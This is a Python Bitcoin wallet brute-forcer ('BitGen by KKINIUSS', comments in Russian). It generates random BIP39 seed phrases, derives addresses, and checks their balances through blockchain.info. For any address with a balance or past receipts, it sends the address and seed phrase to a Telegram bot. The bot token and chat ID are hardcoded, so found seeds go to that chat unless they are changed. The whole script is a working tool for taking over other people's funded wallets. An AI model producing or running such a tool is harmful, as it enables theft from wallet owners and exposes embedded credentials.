from multiprocessing.pool import ThreadPool as Pool
from colored import fg, bg, attr
from Bip39Gen import Bip39Gen
from decimal import Decimal
from time import sleep
import bip32utils
import threading
import requests
import mnemonic
import pprint
import random
import ctypes
import time
import os
from numba import njit
#from notifypy import Notify

timesl = 1# задержка между запросами

token_bot = "1526046385:AAHlG6yMCq4LK6sIUTiOFxeKRRYWER72kh0" # создать бота и получить токен тут @BotFather
chat_id = "453442665" #узнать ваш id можно в боте @userinfobot


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)


def userInput():

    timesltime = round(((60 / timesl) * 100)*60)
    timesltimed = timesltime * 24
    print("{}BitGen by KKINIUSS{}".format(bg("#5F00FF"), attr("reset")))
    print()
    print("{}Скорость генерации : ~{}/час ~{}/день{}".format(bg("#5F00FF"), timesltime, timesltimed,attr("reset")))
    print()
    start()


def getInternet():
    try:
        try:
            requests.get('https://www.google.com')#im watching you!
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance3(addr):

    try:
        response = requests.get(
            f'https://blockchain.info/multiaddr?active={addr}&n=1')

        return (
            response.json()
        )
    except:
        print('{}У тебя походу бан по ip{}'.format(fg("#008700"), attr("reset")))
        time.sleep(600)
        return (getBalance3(addr))
        pass

def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
                                                         random.choice(dictionary)
    return seed

def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)
    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()

def generateBd():
    adrBd = {}
    for i in range(100):
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        adrBd.update([(f'{addy}', mnemonic_words)])

    return adrBd


def listToString(s):
    str1 = "|"
    return (str1.join(s))

def sendBotMsg(msg):
    if token_bot != "":
        try:
            url = f"chat_id={chat_id}&text={msg}"
            requests.get(f"https://api.telegram.org/bot{token_bot}/sendMessage", url)
        except:
            pass

def check():
    while True:
        bdaddr = generateBd()
        addys = listToString(list(bdaddr))
        balances = getBalance3(addys)
        colortmp = 0
        with lock:
            for item in balances["addresses"]:
                addy = item["address"]
                balance = item["final_balance"]
                received = item["total_received"]
                mnemonic_words = bdaddr[addy]
                if balance > 0:
                    msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy, mnemonic_words)
                    sendBotMsg(msg)
                    print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#00ba6f"), balance, received, addy, mnemonic_words, attr( "reset")))
                else:
                    if(received > 0):
                        msg = 'BAL: {} | REC: {} | ADDR: {} | MNEM: {}'.format(balance, received, addy, mnemonic_words)
                        sendBotMsg(msg)
                        print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(
                                    fg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                    else:
                            with open('results/dry.txt', 'a') as w:
                                w.write(f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
                            print('{}BAL: {} | REC: {} | ADDR: {} | MNEM: {}{}'.format(fg("#FFFFF"), balance, received, addy, mnemonic_words, attr("reset")))
                if balance > 0:
                    with open('results/wet.txt', 'a') as w:
                        w.write(
                            f'ADDR: {addy} | BAL: {balance} | MNEM: {mnemonic_words}\n')
        time.sleep(timesl)


def helpText():
    print("""@@@KKINIUSS@@@""")

def start():
    if getInternet() == True:
        check()
    else:
        print("Нет интернета!")
        userInput()


if __name__ == '__main__':
    makeDir()
    getInternet()
    if getInternet() == False:
        print("Нет интернета!")
    else:
        pass
    sendBotMsg("Майнится хуяйнится")
    userInput()